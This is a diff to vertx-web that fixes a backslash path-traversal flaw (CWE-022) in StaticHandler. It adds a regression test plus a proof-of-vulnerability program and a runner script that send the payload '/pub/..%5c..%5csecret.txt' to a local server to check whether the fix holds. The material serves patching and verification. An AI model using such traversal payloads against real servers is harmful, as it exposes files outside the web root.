@@ -1,0 +1,223 @@
+diff --git a/vertx-web/src/main/java/io/vertx/ext/web/handler/impl/StaticHandlerImpl.java b/vertx-web/src/main/java/io/vertx/ext/web/handler/impl/StaticHandlerImpl.java
+index b7d1ea0..b70a340 100644
+--- a/vertx-web/src/main/java/io/vertx/ext/web/handler/impl/StaticHandlerImpl.java
++++ b/vertx-web/src/main/java/io/vertx/ext/web/handler/impl/StaticHandlerImpl.java
+@@ -128,7 +128,10 @@ public class StaticHandlerImpl implements StaticHandler {
+       if (log.isTraceEnabled()) log.trace("Not GET or HEAD so ignoring request");
+       context.next();
+     } else {
+-      String path = HttpUtils.removeDots(URIDecoder.decodeURIComponent(context.normalisedPath(), false));
++      // decode URL and normalize the request path, treating backslashes as path
++      // separators so that backslash-based traversal payloads (e.g. "..%5c..%5c")
++      // cannot escape the web root on any platform (CWE-022).
++      String path = HttpUtils.removeDots(URIDecoder.decodeURIComponent(context.normalisedPath(), false).replace('\\', '/'));
+       // if the normalized path is null it cannot be resolved
+       if (path == null) {
+         log.warn("Invalid path: " + context.request().path());
+diff --git a/vertx-web/src/test/java/io/vertx/ext/web/handler/StaticHandlerTest.java b/vertx-web/src/test/java/io/vertx/ext/web/handler/StaticHandlerTest.java
+index c561c01..5d66ed5 100644
+--- a/vertx-web/src/test/java/io/vertx/ext/web/handler/StaticHandlerTest.java
++++ b/vertx-web/src/test/java/io/vertx/ext/web/handler/StaticHandlerTest.java
+@@ -127,6 +127,18 @@ public class StaticHandlerTest extends WebTestBase {
+     testRequest(HttpMethod.GET, "/somedir/notexists.html", 404, "Not Found");
+   }
+ 
++  @Test
++  public void testBackslashTraversalNormalized() throws Exception {
++    // Backslashes in the request path must be normalized to '/' before dot-segment
++    // removal (CWE-022). Otherwise a backslash traversal payload such as
++    // "..%5c..%5c" survives normalization and is passed straight to the filesystem,
++    // allowing path traversal on platforms where '\' is a separator (e.g. Windows).
++    // With the fix the payload collapses inside the web root to "/otherpage.html";
++    // without it, the literal name "somedir/..\..\otherpage.html" is looked up and
++    // does not exist (404).
++    testRequest(HttpMethod.GET, "/somedir/..%5c..%5cotherpage.html", 200, "OK", "<html><body>Other page</body></html>");
++  }
++
+   @Test
+   public void testDateHeaderSet() throws Exception {
+     testRequest(HttpMethod.GET, "/otherpage.html", null, res -> {
+diff --git a/.security-pipeline/pov/PovStaticHandlerTraversal.java b/.security-pipeline/pov/PovStaticHandlerTraversal.java
+new file mode 100644
+index 0000000..6df3cdd
+--- /dev/null
++++ b/.security-pipeline/pov/PovStaticHandlerTraversal.java
+@@ -0,0 +1,141 @@
++/*
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in vertx-web StaticHandler.
++ *
++ * CVE-aligned request flow:
++ *   HttpServerRequestWrapper.path -> RoutingContextImpl.normalisedPath()
++ *     -> StaticHandlerImpl.handle() (removeDots(decodeURIComponent(normalisedPath)))
++ *     -> StaticHandlerImpl.getFile() -> Utils.pathOffset() -> Vert.x FileSystem lookup
++ *
++ * Root cause (vulnerable code, vertx-web 3.9.3):
++ *   StaticHandlerImpl.handle() computes:
++ *       path = HttpUtils.removeDots(URIDecoder.decodeURIComponent(context.normalisedPath(), false));
++ *   Neither normalizePath() nor removeDots() treat a backslash ('\\') as a path
++ *   separator, so a request path that carries a backslash-based traversal payload
++ *   (e.g. "%5c..%5c..%5c") is passed through UNSANITIZED to the filesystem
++ *   resolution layer. On Windows the backslashes act as directory separators and
++ *   let the request escape the configured web root. This is exactly the behavior
++ *   the finder flagged: raw request-controlled backslash/traversal bytes reach
++ *   getFile() / the FileSystem callable without normalization.
++ *
++ * The 3.9.4 fix rewrites the same line to normalize backslashes to forward slashes
++ * *before* removing dot segments:
++ *       path = HttpUtils.removeDots(uriDecodedPath.replace('\\', '/'));
++ * After the fix the traversal payload collapses to a normal '/'-delimited path,
++ * the dot segments are removed, and the crafted resource can no longer be reached.
++ *
++ * Because the POV runs on Linux (where '\\' is an ordinary filename byte rather
++ * than a separator), we observe the vulnerable *code behavior* directly and in a
++ * platform-independent, patch-sensitive way:
++ *
++ *   - We create a real web root containing a subdirectory "pub".
++ *   - Inside "pub" we place a file whose literal on-disk name is "..\\..\\secret.txt"
++ *     (a single, valid Linux filename) — i.e. the exact byte sequence the attacker's
++ *     backslash traversal payload decodes to.
++ *   - We drive a REAL HTTP request `/pub/..%5c..%5csecret.txt` through a real
++ *     Router + StaticHandler + HTTP server.
++ *
++ *   VULNERABLE (3.9.3): the backslashes survive normalization, so getFile() resolves
++ *     webRoot + "/pub/..\\..\\secret.txt", the file exists, and the server returns
++ *     200 with the secret body -> the request-controlled traversal payload reached
++ *     the filesystem unsanitized. POV exits 0.
++ *
++ *   PATCHED (3.9.4+): the backslashes are converted to '/', removeDots collapses
++ *     "/pub/../../secret.txt" to "/secret.txt", which does not exist -> 404/no body.
++ *     POV exits non-zero.
++ */
++
++import io.vertx.core.Vertx;
++import io.vertx.core.buffer.Buffer;
++import io.vertx.core.http.HttpClient;
++import io.vertx.core.http.HttpMethod;
++import io.vertx.core.http.HttpServer;
++import io.vertx.ext.web.Router;
++import io.vertx.ext.web.handler.StaticHandler;
++
++import java.io.File;
++import java.nio.charset.StandardCharsets;
++import java.nio.file.Files;
++import java.util.concurrent.CountDownLatch;
++import java.util.concurrent.TimeUnit;
++import java.util.concurrent.atomic.AtomicInteger;
++import java.util.concurrent.atomic.AtomicReference;
++
++public class PovStaticHandlerTraversal {
++
++  private static final String SECRET = "TOP-SECRET-PATH-TRAVERSAL-MARKER";
++  private static final int PORT = 18080;
++
++  public static void main(String[] args) throws Exception {
++    // 1. Build a real web root with the traversal payload materialized on disk.
++    File webRoot = Files.createTempDirectory("pov-webroot-").toFile();
++    File pub = new File(webRoot, "pub");
++    if (!pub.mkdirs()) throw new IllegalStateException("could not create pub dir");
++
++    // Literal filename "..\..\secret.txt" (backslashes are ordinary chars on Linux).
++    File payloadFile = new File(pub, "..\\..\\secret.txt");
++    Files.write(payloadFile.toPath(), SECRET.getBytes(StandardCharsets.UTF_8));
++    if (!payloadFile.isFile()) throw new IllegalStateException("payload file not created: " + payloadFile);
++
++    Vertx vertx = Vertx.vertx();
++    try {
++      Router router = Router.router(vertx);
++      // allowRootFileSystemAccess only lets us point webRoot at an absolute temp dir;
++      // it does not affect the traversal/normalization logic under test.
++      StaticHandler stat = StaticHandler.create()
++        .setAllowRootFileSystemAccess(true)
++        .setWebRoot(webRoot.getAbsolutePath())
++        .setDirectoryListing(false)
++        .setCachingEnabled(false);
++      router.route().handler(stat);
++
++      HttpServer server = vertx.createHttpServer();
++      CountDownLatch listenLatch = new CountDownLatch(1);
++      AtomicReference<Throwable> listenErr = new AtomicReference<>();
++      server.requestHandler(router).listen(PORT, "localhost", ar -> {
++        if (ar.failed()) listenErr.set(ar.cause());
++        listenLatch.countDown();
++      });
++      if (!listenLatch.await(30, TimeUnit.SECONDS)) throw new IllegalStateException("server did not start");
++      if (listenErr.get() != null) throw new RuntimeException("listen failed", listenErr.get());
++
++      // 2. Send the crafted backslash traversal request through the real handler.
++      HttpClient client = vertx.createHttpClient();
++      final String traversalUri = "/pub/..%5c..%5csecret.txt";
++
++      AtomicInteger status = new AtomicInteger(-1);
++      AtomicReference<String> body = new AtomicReference<>("");
++      CountDownLatch reqLatch = new CountDownLatch(1);
++
++      client.request(HttpMethod.GET, PORT, "localhost", traversalUri, resp -> {
++        status.set(resp.statusCode());
++        resp.bodyHandler(b -> {
++          body.set(b.toString(StandardCharsets.UTF_8));
++          reqLatch.countDown();
++        });
++        resp.exceptionHandler(t -> reqLatch.countDown());
++      }).exceptionHandler(t -> reqLatch.countDown()).end();
++
++      if (!reqLatch.await(30, TimeUnit.SECONDS)) throw new IllegalStateException("request timed out");
++
++      System.out.println("[POV] request URI : " + traversalUri);
++      System.out.println("[POV] web root    : " + webRoot.getAbsolutePath());
++      System.out.println("[POV] status code : " + status.get());
++      System.out.println("[POV] body        : " + body.get());
++
++      boolean served = status.get() == 200 && body.get().contains(SECRET);
++      if (served) {
++        System.out.println("[POV] VULNERABLE: backslash traversal payload reached the "
++          + "filesystem unsanitized and the guarded resource was served.");
++        System.exit(0);
++      } else {
++        System.out.println("[POV] NOT VULNERABLE: traversal payload was normalized/blocked "
++          + "(status=" + status.get() + ").");
++        System.exit(1);
++      }
++    } finally {
++      CountDownLatch closeLatch = new CountDownLatch(1);
++      vertx.close(ar -> closeLatch.countDown());
++      closeLatch.await(10, TimeUnit.SECONDS);
++    }
++  }
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..beba952
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,31 @@
++#!/usr/bin/env bash
++# POV runner for CWE-022 path traversal in vertx-web StaticHandler.
++# Runs inside the project container at /workspace/repo.
++# Exit 0  => vulnerable behavior reproduced (unpatched code).
++# Exit !0 => traversal blocked/normalized (patched code) or build failure.
++set -euo pipefail
++
++REPO="/workspace/repo"
++POV_DIR="${REPO}/.security-pipeline/pov"
++cd "${REPO}"
++
++# 1. Build the project classes (picks up whatever StaticHandlerImpl is on disk,
++#    so the same command flips vulnerable->fixed after a correct patch).
++mvn -q -o -pl vertx-web -am -DskipTests package >/tmp/pov_build.log 2>&1 || {
++  echo "[POV] build failed"; tail -40 /tmp/pov_build.log; exit 3;
++}
++
++# 2. Assemble a classpath from the reactor output + local dependency jars.
++CP="${REPO}/vertx-web/target/classes"
++CP="${CP}:${REPO}/vertx-web-common/target/classes"
++for j in \
++  "$(ls ~/.m2/repository/io/vertx/vertx-core/3.9.3/vertx-core-3.9.3.jar)" \
++  "$(ls ~/.m2/repository/io/vertx/vertx-auth-common/3.9.3/vertx-auth-common-3.9.3.jar)" \
++  $(find ~/.m2/repository/io/netty -name 'netty-*.jar') \
++  $(find ~/.m2/repository/com/fasterxml/jackson -name 'jackson-*.jar'); do
++  CP="${CP}:${j}"
++done
++
++# 3. Compile and run the POV.
++javac -cp "${CP}" -d "${POV_DIR}" "${POV_DIR}/PovStaticHandlerTraversal.java"
++java -cp "${CP}:${POV_DIR}" PovStaticHandlerTraversal
